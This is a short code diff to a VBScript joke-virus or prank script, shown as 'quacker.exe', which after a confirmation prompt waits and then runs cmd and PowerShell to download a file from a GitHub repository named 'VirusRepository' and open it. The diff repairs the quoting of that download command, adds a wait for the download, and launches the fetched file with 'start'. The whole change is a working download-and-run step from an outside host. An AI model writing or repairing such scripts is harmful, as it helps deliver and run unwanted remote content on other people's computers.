@@ -32,9 +32,14 @@ If intAnswer = vbYes Then
         WScript.Sleep 5000
         
         ' Final message
-        MsgBox "draw with the last seconds with your pc", vbOk, "quacker.exe"
-        oShell.Run "cmd.exe /C powershell -Command Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/a.mp4 -Outfile a4.mp4"
-        oShell.Run "cmd.exe /C a4.mp4"
+        ' Download the file using PowerShell
+        oShell.Run "cmd.exe /C powershell -Command ""Invoke-WebRequest -Uri 'https://github.com/ironyumrepos/VirusRepository/raw/main/a.mp4' -OutFile 'a4.mp4'"""
+        
+        ' Wait for the download to complete (adjust the wait time if necessary)
+        WScript.Sleep 10000
+        
+        ' Open the downloaded file
+        oShell.Run "cmd.exe /C start a4.mp4"
     Else
         WScript.Quit
     End If
